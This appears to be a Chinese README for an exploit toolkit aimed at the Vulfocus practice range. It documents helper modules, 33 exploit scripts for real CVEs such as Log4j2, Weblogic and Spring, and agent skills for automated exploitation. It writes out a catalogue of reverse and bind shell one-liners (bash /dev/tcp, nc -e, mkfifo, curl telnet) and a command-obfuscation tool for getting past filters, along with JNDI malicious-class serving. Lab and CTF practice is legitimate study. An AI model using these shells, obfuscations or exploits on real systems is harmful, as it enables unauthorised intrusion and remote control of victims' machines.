# VulfocusExp

这是一个 Vulfocus 靶场的 Exploit 库，致力于快速 flag 获取。

## 项目简介

本项目集成了常见 Web 框架和服务的漏洞利用脚本，采用模块化设计，支持自动化目标扫描、漏洞利用和 flag 提取。适用于渗透测试、CTF 竞赛和漏洞复现场景。

## 项目结构

```
.
├── tool/                                              # 核心工具库
│   ├── __init__.py                                   # 包初始化
│   ├── base.py                                       # 基础工具（命令执行、flag匹配、进程管理）
│   ├── http_repeater.py                              # 原始 HTTP 请求重放器
│   ├── http_server.py                                # 简易 HTTP 服务器（回显/文件）
│   ├── port_scan.py                                  # 端口服务检测
│   ├── bash_obf.py                                   # Bash 命令混淆工具（17种）
│   ├── local_ip.py                                   # 本机 IP 获取
│   ├── log.py                                        # 调试日志
│   ├── code.py                                       # 漏洞利用代码模板
│   ├── shell_rb.py                                   # TCP 反向/绑定 Shell 管理器
│   ├── JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar   # JNDI 注入工具（~10MB）
│   ├── marshalsec-0.0.3-SNAPSHOT-all.jar            # 反序列化工具（~42MB）
│   └── goahead_cve_2021_42342.so                    # GoAhead 漏洞利用库（~14KB）
│
├── .agents/skills/                                   # Agent Skill 系统（20个）
│   ├── ctf-crypto/                                  # 密码学攻击（RSA/AES/ECC/格）
│   ├── ctf-forensics/                               # 数字取证（磁盘镜像/内存/PCAP）
│   ├── ctf-malware/                                  # 恶意软件分析（C2通信/加壳）
│   ├── ctf-misc/                                    # 杂项（pyjails/bashjails/DNS/游戏）
│   ├── ctf-web/                                     # Web 渗透（SQLi/XSS/SSTI/反序列化）
│   ├── java-audit-pipeline/                         # Java 审计流水线（Agent Team）
│   ├── java-auth-audit/                             # Java 鉴权审计
│   ├── java-route-mapper/                          # Java 路由提取
│   ├── java-route-tracer/                          # Java 调用链追踪
│   ├── java-sql-audit/                             # Java SQL 注入审计
│   ├── java-xxe-audit/                             # Java XXE 审计
│   ├── java-file-read-audit/                       # Java 文件读取审计
│   ├── java-file-upload-audit/                     # Java 文件上传审计
│   ├── java-vuln-scanner/                         # Java 组件漏洞扫描
│   ├── vulfocus_solve/                             # Vulfocus 做题流程
│   ├── vulnerability-rating/                       # 漏洞评分（CVSS 3.1）
│   ├── dirsearch-command-generator/                # dirsearch 命令生成
│   ├── flutter-ssl-analysis/                      # Flutter SSL 分析
│   ├── web-feature-search/                        # FOFA/Hunter 搜索
│   └── xlsx/                                      # Excel 操作与验证
│
├── [漏洞名].py                                      # 漏洞利用脚本（33个）
├── main.py                                          # 主入口（批量处理）⚠️ 待实现
└── README.md
```

## 依赖安装

```bash
uv sync
```

## 核心模块

### tool/base.py

基础工具模块，提供核心功能：

| 函数/类 | 功能 |
|---------|------|
| `set_debug()` | 启用调试模式，输出详细日志 |
| `set_no_debug()` | 关闭调试模式 |
| `wait(func, timeout, interval)` | 等待条件函数返回 True |
| `match_flag(text)` | 从文本中提取单个 flag |
| `match_flags(text)` | 从文本中提取所有 flag |
| `get_local_ip()` | 获取本机出口 IP |
| `run_cmd(command, timeout)` | 同步执行 shell 命令 |
| `RunCmd(command, timeout)` | 非阻塞命令执行器 |
| `CommandResult` | 命令执行结果数据类 |
| `TargetGroup` | 目标组类，管理多端口目标 |
| `parse_ip_port(str)` | 解析 "ip:port1,port2" 格式 |
| `process(ip_port, run, on_process)` | 遍历 URL 并执行利用 |
| `process_with(ip_port, run, types)` | 遍历 (ip, port) 并执行利用 |

#### 详细接口

```python
# 调试模式（内部委托 tool.log）
set_debug()  # 启用后可通过 EXP_DEBUG=true 环境变量开启详细日志

# Flag 匹配
match_flag(text: str) -> str | None  # 返回第一个匹配的 flag
match_flags(text: str) -> list[str]  # 返回所有匹配的 flag
# 匹配模式: flag-{xxx} 或 flag{xxx}（不区分大小写）

# 命令执行
run_cmd(command: str, timeout: int = 120) -> CommandResult
# 返回: CommandResult(ok: bool, output: str, error: str)

class RunCmd:
    def __init__(self, command: str, timeout: int = 300)
    def run(self) -> tuple[bool, str]  # 启动命令，返回 (是否成功, 消息)
    def join(self) -> CommandResult   # 阻塞等待完成
    def stop(self) -> CommandResult   # 终止进程（SIGTERM→SIGKILL 进程组）
    def reset(self) -> None          # 重置状态，可重新 run()
    def __enter__(self) / def __exit__(self)  # 上下文管理器

# 目标处理
parse_ip_port(ip_port: str) -> TargetGroup
# 输入格式: "ip:port1,port2,..." 如 "192.168.1.1:8000,8001"

class TargetGroup:
    ip: str                           # IP 地址
    ports: list[int]                 # 端口列表（int 类型）
    ok: bool                         # 解析是否成功
    error: str                       # 错误信息

    def build_urls(self) -> list[str]          # 构建 URL 列表（根据服务检测自动识别 http/https）
    def ip_port(self) -> list[tuple[str, int]] # 返回所有 (ip, port) 元组
    def ip_port_with(types) -> list[tuple[str, int]]  # 按服务类型过滤
    def detect_services(timeout=3) -> list[tuple[int, Service]]  # 检测端口服务类型

# 处理函数
process(ip_port: str, run: Callable, on_process: Callable = None)
process_with(ip_port: str, run: Callable, types: list[Service] = None)
# run 函数签名为: run(target) -> tuple[bool, str | list[str], str]
# 返回: (是否成功, flag或flag列表, 错误信息)
```

---

### tool/http_repeater.py

原始 HTTP 请求重放器，支持：

- 原始 HTTP 请求发送（完整控制请求行/头/体）
- SSL/TLS 支持（可忽略证书验证）
- 自动处理 Chunked 编码
- 自动解压 Content-Encoding（gzip/deflate/brotli）
- 自动 Cookie 管理

#### 详细接口

```python
# 响应类
@dataclass
class RawResponse:
    ok: bool                 # 请求是否成功
    error: str               # 错误信息
    resp: bytes              # 原始响应字节

    def __bool__(self) -> bool           # 返回 ok 值
    def text(self, encoding="utf-8") -> str          # 解码响应为字符串
    def status_line(self) -> str         # 获取 HTTP 状态行
    def headers(self) -> Dict[str, List[str]]  # 解析响应头（key 小写）
    def body(self) -> bytes              # 获取响应体（已解压）
    def body_text(self, encoding="utf-8") -> str     # 解码响应体
    def build_cookie(self, old_cookie="") -> str | None  # 从 Set-Cookie 构建请求 Cookie

# 核心函数
def repeater(
    raw_request: str | bytes,
    port: int | None = None,
    host: str | None = None,
    use_ssl: bool = False,
    verify_ssl: bool = False,
    timeout: int = 4,
    max_response_size: int = 3*1024*1024,
    fix_content_length: bool = True,
    headers: dict | None = None
) -> RawResponse
```

#### 使用示例

```python
from tool.http_repeater import repeater

# 基础用法
exp = f"""POST /admin/login HTTP/1.1
Host: {target[0]}:{target[1]}
Content-Type: application/json

{"username":"admin"}
"""
resp = repeater(exp)
if resp.ok:
    print(resp.text())
    cookie = resp.build_cookie()  # 从 Set-Cookie 构建 Cookie

# 带额外头
resp = repeater(exp, headers={"Cookie": "session=xxx"})

# HTTPS
resp = repeater(exp, use_ssl=True, verify_ssl=False)
```

---

### tool/http_server.py

简易 HTTP 服务器：支持回显请求记录和文件下载两种模式。

#### 类概览

| 类 | 功能 |
|-----|------|
| `_BaseHttpServer` | 抽象基类，封装通用服务器逻辑 |
| `HttpEcho` | 回显服务器，记录所有请求（GET/POST/PUT/DELETE/PATCH） |
| `HttpFile` | 文件服务器，提供文件下载 |
| `EchoRequest` | 请求记录数据结构 |

#### _BaseHttpServer 基类

| 方法 | 参数 | 说明 |
|------|------|------|
| `__init__` | `port: int = 0` | **port=0 时由 OS 自动分配端口**，port>0 时绑定指定端口 |
| `start()` | - | 启动服务器，返回 self（幂等操作） |
| `stop()` | - | 停止服务器，join 等待线程退出 |
| `port()` | - | 获取实际监听端口，**必须在 start() 后调用**，否则抛 `RuntimeError` |
| `__enter__` / `__exit__` | - | 上下文管理器（自动调用 start/stop） |

**端口分配说明**：传入 `port=0` 时，操作系统会在 49152-65535 范围内动态分配空闲端口。通过 `server.port()` 可获取实际分配的端口号，适用于多实例并发场景。

#### 详细接口

```python
@dataclass
class EchoRequest:
    ip: str                  # 请求来源 IP
    method: str               # HTTP 方法
    path: str                # 请求路径
    headers: dict[str, str]  # 请求头（dict）
    body: bytes              # 请求体
    timestamp: float         # 时间戳

    def __str__(self) -> str  # 格式化输出

class HttpEcho(_BaseHttpServer):
    def __init__(self, port=8000)                    # 默认端口 8000
    def start(self) -> "HttpEcho"                      # 启动服务器
    def stop(self) -> None                            # 停止服务器
    def port(self) -> int                             # 获取实际端口
    def requests(self) -> list[EchoRequest]            # 获取所有请求记录副本
    def echo(self) -> str                             # 格式化输出所有请求

class HttpFile(_BaseHttpServer):
    def __init__(self, files: dict[str, bytes | Path], port=8001)
    # files: 文件名到内容的映射，支持 bytes（内存）或 Path（磁盘）
    # 支持的 HTTP 方法: GET
```

#### 使用示例

```python
from tool.http_server import HttpEcho, HttpFile
from tool.base import run_cmd, wait

# === HttpEcho 用法（盲打 RCE 回显） ===

# 方式1：指定端口
with HttpEcho(port=8000) as echo:
    # 触发漏洞，使目标发送请求到本机
    wait(lambda: len(echo.requests()) > 0, timeout=10)
    print(echo.echo())
    for req in echo.requests():
        print(f"来自 {req.ip} 的 {req.method} 请求，路径: {req.path}")

# 方式2：自动分配端口（port=0）
with HttpEcho(port=0) as echo:
    print(f"OS 分配的端口: {echo.port()}")  # 获取实际端口
    # 将此端口用于构造回连 payload

# === HttpFile 用法（提供恶意文件、JNDI Payload 等） ===

# 方式1：指定端口 + bytes 内容
with HttpFile({"shell.class": malicious_bytes}, port=8001) as f:
    print(f"文件服务器端口: {f.port()}")

# 方式2：自动分配端口 + Path 磁盘文件
from pathlib import Path
with HttpFile({"Echo.class": Path("./Echo.class")}, port=0) as f:
    print(f"OS 分配端口: {f.port()}")
    # 用于 JNDI 注入场景，提供恶意 class 文件
```

---

### tool/port_scan.py

端口服务检测：识别 HTTP/HTTPS/SSH/数据库等服务类型

#### 详细接口

```python
class Service(Enum):
    """服务类型枚举"""
    HTTP = "http"
    HTTPS = "https"
    MYSQL = "mysql"
    REDIS = "redis"
    SSH = "ssh"
    FTP = "ftp"
    SMTP = "smtp"
    DNS = "dns"
    TELNET = "telnet"
    POP3 = "pop3"
    IMAP = "imap"
    SMB = "smb"
    RDP = "rdp"
    VNC = "vnc"
    MONGODB = "mongodb"
    POSTGRESQL = "postgresql"
    ELASTICSEARCH = "elasticsearch"
    UNKNOWN = "unknown"  # 端口开放但无法识别
    NONE = "none"        # 端口未开放

# 同步接口
def detect_services_fast(
    target: tuple[str, list[int]],
    timeout: float = 2.5
) -> list[tuple[int, Service]]
# 返回: [(端口, 服务类型), ...]

# 异步接口
async def detect_services_async(
    target: tuple[str, list[int]],
    timeout: float = 2.5
) -> list[tuple[int, Service]]
```

**探测策略**：被动（等待 banner）+ 主动（发送探测数据），按优先级匹配，找到即取消其他任务。

---

### tool/code.py

漏洞利用代码模板：包含各类漏洞的利用代码片段

#### 详细接口

```python
# Java JNDI 注入 Echo 类模板
java_echo: str
# 模板变量: {{ip}} 和 {{port}}
# 用于 Log4j2 等漏洞的 JNDI 注入利用
```

#### 使用示例

```python
from tool.code import java_echo

# 替换模板变量并编译
java = java_echo.replace("{{ip}}", ip).replace("{{port}}", "8000")
with open("Echo.java", "w") as f:
    f.write(java)
# javac Echo.java
```

---

### tool/local_ip.py

本机 IP 获取：智能选择最佳网络接口

#### 详细接口

```python
def get_ip(verbose: bool = False) -> str | None
# verbose: 是否打印详细的候选接口评分信息
# 返回最佳 IPv4 地址，没有找到则返回 None
```

#### 功能说明

- 自动排除虚拟接口（Docker、VMWare、WSL、VirtualBox、TUN、TAP、网桥等）
- 优先选择有线网卡（eth、ens、enp 等，30 分）
- 按网段评分（公网 25 > 10.0.0.0/8 为 15 > 172.16.0.0/12 为 10 > 192.168.0.0/16 为 5）
- 支持 Windows、Linux、macOS

---

### tool/bash_obf.py

Bash 命令混淆工具：17 种混淆方法，用于绕过命令过滤

#### 详细接口

```python
# 可用的混淆方法
OBFUSCATIONS = {
    "path_slash":      # / -> ${PATH:0:1}
    "ifs1":            # 空格 -> $IFS$9
    "ifs2":            # 空格 -> ${IFS}
    "tab":             # 空格 -> Tab 字符
    "bash_c_ifs1":     # bash -c cat$IFS$9/etc/passwd（java.lang.Runtime.exec 常用）
    "base64":          # echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash
    "base64_bash_c":   # bash -c + base64
    "hex1":            # printf 十六进制转义
    "hex2":            # echo -e 十六进制转义
    "oct1":            # 八进制转义
    "rev1":            # 命令反转（单引号）
    "rev2":            # 命令反转（双引号）
    "backslash":       # 字符间插入反斜杠
    "dollar_brackets": # echo $(cmd)
    "double_quotes":   # 字符间插入 ""
    "single_quotes":   # 字符间插入 ''
    "empty_var":       # 字符间插入 $@
    "xxd":             # xxd 十六进制编码
    "base64_python3_c": # python3 -c 执行
}

# 核心函数
def apply_obf(name: str, cmd: str, **kwargs) -> str | None
# 应用单个混淆方法，返回 None 表示该方法不适用（命令含禁止字符）

def apply_obfs(
    cmd: str,
    obf: list[str] | None = None,
    **kwargs
) -> str | None
# 应用多个混淆方法（顺序执行），返回 None 表示中途失败

def random_obf(
    cmd: str,
    obf: list[str] | None = None,
    depth: int = 4,
    args: dict | None = None
) -> str
# 随机深度混淆，depth 为混淆层数，args 为参数字典
```

#### 使用示例

```python
from tool.bash_obf import apply_obfs, random_obf

# 指定混淆方法
result = apply_obfs("ls /tmp", obf=["base64", "rev1"])

# 随机混淆
result = random_obf("cat /etc/passwd", depth=3)
# 随机组合 3 种混淆方法

# 指定可用方法
methods = ["base64", "bash_c_ifs1", "hex1"]
result = random_obf("ls /", obf=methods, depth=2)
```

---

### tool/log.py

调试日志模块，核心基础设施：

| 函数                      | 说明 |
|-------------------------|------|
| `set_debug()`           | 启用调试模式，设置 `EXP_DEBUG=true` |
| `set_no_debug()`        | 关闭调试模式 |
| `debug_log(msg, tag="")` | 输出调试日志，自动获取调用者函数名和文件名 |

**说明**：`tool.base` 中的 `set_debug()` 和 `debug_log()` 实际代理此模块。

---

### tool/shell_rb.py

TCP 反向/绑定 Shell 管理器，用于 RCE 场景下的命令交互：

#### 类

| 类               | 说明 |
|-----------------|------|
| `TcpShellR`     | 反向 Shell 服务器（监听端口接收连接） |
| `TcpShellB`     | 绑定 Shell 客户端（主动连接目标端口） |
| `RecvData`      | 接收数据记录（timestamp + data） |
| `TcpShellRError` | 反向 Shell 异常 |
| `TcpShellBError` | 绑定 Shell 异常 |

#### TcpShellR 接口

| 方法                                  | 说明 |
|-------------------------------------|------|
| `start()`                           | 启动监听服务器，返回 self |
| `stop()`                            | 停止服务器 |
| `port()`                            | 获取实际监听端口（需在 start() 后调用） |
| `is_connected()`                    | 检查是否有客户端连接 |
| `send(data: str \| bytes)`          | 发送数据 |
| `sendline(data: str)`               | 发送字符串并追加换行符 |
| `output(timeout, idle_ms, encoding)` | 等待数据接收完毕返回（idle_ms 毫秒无新数据则认为结束） |
| `peek(encoding)`                    | 查看缓冲区数据（不消费） |

#### TcpShellB 接口

| 方法                                  | 说明 |
|-------------------------------------|------|
| `connect(host, port)`               | 连接到目标 |
| `disconnect()`                      | 断开连接 |
| `is_connected()`                    | 检查连接状态 |
| `interactive()`                     | 进入交互模式（标准输入/输出转发） |
| `send(data)` / `sendline(data)`     | 同 TcpShellR |
| `output(timeout, idle_ms, encoding)` | 同 TcpShellR |
| `peek(encoding)`                    | 同 TcpShellR |


#### Shell 命令生成

```python
def gen_shell_r_cmd(name: str, ip: str, port: int) -> str | None
# 生成反向 Shell 命令，模板名见下方列表

def gen_shell_b_cmd(name: str, port: int) -> str | None
# 生成绑定 Shell 命令，模板名见下方列表
```

**反向 Shell 模板**（17 种）：

| 模板名                  | 说明 |
|----------------------|------|
| `bash_i`             | `bash -i >& /dev/tcp/{ip}/{port} 0>&1` |
| `bash_196`           | `0<&196;exec 196<>/dev/tcp/{ip}/{port}; bash <&196 >&196 2>&196` |
| `bash_read_line`     | `exec 5<>/dev/tcp/{ip}/{port};cat <&5 \| while read line; do $line 2>&5 >&5; done` |
| `nc_c_bash`          | `nc -c bash {ip} {port}` |
| `nc_c_sh`            | `nc -c sh {ip} {port}` |
| `nc_e_bash`          | `nc {ip} {port} -e /bin/bash` |
| `nc_e_sh`            | `nc {ip} {port} -e /bin/sh` |
| `busybox_nc_e_bash`  | `busybox nc {ip} {port} -e /bin/bash` |
| `busybox_nc_e_sh`    | `busybox nc {ip} {port} -e /bin/sh` |
| `curl_bash`          | `C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 \| bash 2>&1 \| $C >/dev/null` |
| `awk`                | `awk 'BEGIN{...}' /dev/null` |
| `zsh`                | `zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'` |
| `python3_bash`       | Python3 反向 Shell |
| `nc_mkfifo_bash`     | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|bash -i 2>&1\|nc {ip} {port} >/tmp/f` |
| `openssl_mkfifo_bash` | OpenSSL + mkfifo |
| `powershell1`        | PowerShell 反向 Shell |

**绑定 Shell 模板**（3 种）：

| 模板名            | 说明 |
|----------------|------|
| `nc_l_bash`    | `nc -l -p {port} -e /bin/bash` |
| `nc_mkfifo_sh` | mkfifo + nc 监听 |
| `python3`      | Python3 绑定 Shell |

#### 使用示例

```python
from tool.shell_rb import TcpShellR, gen_shell_r_cmd, TcpShellB, gen_shell_b_cmd
from tool.base import wait, RunCmd

# === 反向 Shell 用法 ===
ip = get_local_ip()
with TcpShellR() as shell:
    cmd = gen_shell_r_cmd("bash_i", ip, shell.port())
    print(cmd)  # 在目标上执行此命令
    wait(lambda: shell.is_connected())
    shell.sendline("id")
    shell.sendline("ls /tmp")
    print(shell.output(timeout=5))

# === 绑定 Shell 用法 ===
with TcpShellB() as shell:
    port = 9000
    cmd = gen_shell_b_cmd("nc_l_bash", port)
    print(cmd)  # 在目标上先执行监听
    with RunCmd(cmd) as s:
        s.run()
        shell.connect(ip, port)
        shell.sendline("id")
        print(shell.output())
```

---

## Exp 实现

### Exp 结构

```python
from tool.base import match_flag, process_with, get_local_ip, run_cmd
from tool.http_repeater import repeater
from tool.http_server import HttpEcho


def run(target: tuple[str, int]) -> tuple[bool, str | list[str], str]:
    exp1 = f"""POST /ucms/login.php HTTP/1.1
Host: {target[0]}:{target[1]}
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

uuu_username=admin&uuu_password=123456
"""
    resp = repeater(exp1)
    if not resp:
        return False, "", f"exp1:{resp.error}"

    flag = match_flag(resp.text())
    if not flag:
        return False, "", "flag 匹配失败"

    return True, flag, ""


def main(ip_port: str):
    process_with(ip_port, run)


if __name__ == "__main__":
    __import__("tool.base", fromlist=["set_debug"]).set_debug()
    main("192.168.192.148:42740")
```

**返回值约定**：`run(target)` 返回 `(ok, flag, error)` — `ok=True` 表示成功，`flag` 为单个或多个 flag 字符串。

---

### 漏洞利用列表（33 个）

| 漏洞名称 | CVE 编号 | 漏洞名称 | CVE 编号 |
|---------|---------|---------|---------|
| bash 命令执行 | CVE-2014-6271 | Struts2 命令执行 | CVE-2013-1965 |
| Weblogic 远程代码执行 | CVE-2018-2893 | Struts2 命令执行 | CVE-2017-12611 |
| Weblogic wls-wsat | CVE-2017-3506 | Druid 远程命令执行 | CVE-2021-25646 |
| Weblogic CVE-2020-14883 | CVE-2020-14883 | Nexus 命令执行 | CVE-2020-10199 |
| Spring Framework RCE | CVE-2022-22965 | Nexus 命令执行 | CVE-2020-10204 |
| Log4j2 远程命令执行 | CVE-2021-44228 | XXL-JOB 远程命令执行 | - |
| O2OA 命令执行 | CVE-2022-22916 | GitLab 命令执行 | CVE-2021-22205 |
| Redis Lua 沙盒绕过 | CVE-2022-0543 | Solr 远程命令执行 | CVE-2019-17558 |
| Node.js 命令执行 | CVE-2021-21315 | GoAhead 变量注入 | CVE-2021-42342 |
| H2Database RCE | CVE-2022-23221 | CouchDB 权限绕过 | CVE-2017-12635 |
| UCMS 远程命令执行 | CVE-2020-25483 | Elfinder 命令注入 | CVE-2021-32682 |
| OpenSNS 命令执行 | CNVD-2021-34590 | Rconfig 远程命令执行 | CVE-2019-16662 |
| Nuxeo 命令执行 | CVE-2018-16341 | Webmin 远程命令执行 | CVE-2019-15107 |
| ThinkPHP3.2.x 代码执行 | - | HTTPd 后缀解析 | - |
| HTTPd SSI 命令执行 | - | WordPress SQL注入 | CVE-2022-0228 |
| phpMyAdmin SQL注入 | CVE-2020-5504 | | |

---

## Agent Skill 系统

本项目包含 **20 个** CTF Agent Skill，与 opencode agent 系统集成，用于自动化解题流程：

```python
# 使用 skill 工具加载
skill("ctf-web")      # Web 渗透攻击技术
skill("ctf-crypto")   # 密码学攻击（RSA/AES/ECC/格/证明系统）
skill("ctf-forensics") # 数字取证（磁盘镜像/内存dump/PCAP/信号）
skill("ctf-misc")     # 杂项（pyjails/bashjails/DNS/游戏/编码）
skill("ctf-malware")  # 恶意软件分析（C2通信/加壳/脚本混淆）
skill("vulfocus_solve")  # Vulfocus 做题流程（情报收集→PoC验证→Exploit→Flag）

# Java 审计系列（配合 agent team 编排）
skill("java-audit-pipeline")   # 全链路审计流水线
skill("java-auth-audit")       # Java 鉴权审计
skill("java-route-mapper")     # Java 路由提取
skill("java-route-tracer")     # Java 调用链追踪
skill("java-sql-audit")        # Java SQL 注入审计
skill("java-xxe-audit")        # Java XXE 审计
skill("java-file-read-audit")   # Java 文件读取审计
skill("java-file-upload-audit") # Java 文件上传审计
skill("java-vuln-scanner")     # Java 组件漏洞扫描

# 其他
skill("vulnerability-rating")   # 漏洞严重性评分（CVSS 3.1）
skill("dirsearch-command-generator")  # dirsearch 命令生成
skill("flutter-ssl-analysis")  # Flutter SSL 分析（BoringSSL Frida）
skill("xlsx")                 # Excel 操作与验证（.xlsx/.docx/.pptx）
skill("web-feature-search")    # FOFA/Hunter 搜索
```

---

## 注意事项

- 验证 poc/exp 可行后需要完成与该项目兼容且符合结构的 `[题目名].py` 并进行测试，直到 exp 完善
- 调试模式：设置环境变量 `EXP_DEBUG=true` 可查看详细执行日志
- 端口格式：`ip:port` 或 `ip:port1,port2,port3`（多个端口用逗号分隔）
